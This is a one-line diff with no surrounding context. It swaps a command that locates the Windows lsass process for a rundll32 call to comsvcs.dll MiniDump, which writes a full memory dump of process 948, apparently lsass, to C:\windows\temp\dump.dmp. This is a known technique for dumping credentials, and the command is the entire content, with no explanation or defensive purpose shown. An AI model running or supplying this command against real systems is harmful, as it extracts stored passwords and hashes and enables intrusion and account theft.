@@ -1,1 +1,1 @@
-tasklist | findstr -i 'lsass'
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 948 C:\windows\temp\dump.dmp full
